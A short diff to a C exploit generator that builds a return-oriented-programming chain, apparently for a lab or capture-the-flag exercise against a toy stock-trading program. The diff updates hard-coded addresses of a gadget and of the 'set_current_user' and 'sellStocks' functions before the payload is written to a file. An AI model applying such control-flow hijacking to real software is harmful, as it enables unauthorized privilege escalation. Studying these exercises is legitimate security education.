@@ -31,17 +31,17 @@ int main() {
 	curBuf = insert8Bytes(savedEbp, curBuf);
 
 
-	long long rdpGadget = 0x7FFFF7DE9B6A;
+	long long rdpGadget = 0x7FFFF79E7B6A;
 	curBuf = insert8Bytes(rdpGadget, curBuf);
 
 	long long one = 1;
 	curBuf = insert8Bytes(one, curBuf);
 
-	long long set_current_user = 0x555555555289;
+	long long set_current_user = 0x7ffff3dd3289;
 	curBuf = insert8Bytes(set_current_user, curBuf);
 
 
-	long long sellStocks = 0x5555555552a6;
+	long long sellStocks = 0x7ffff3dd32a6;
 	curBuf = insert8Bytes(sellStocks, curBuf );
 
 	fwrite(bigBuffer, 120, 1, fp );
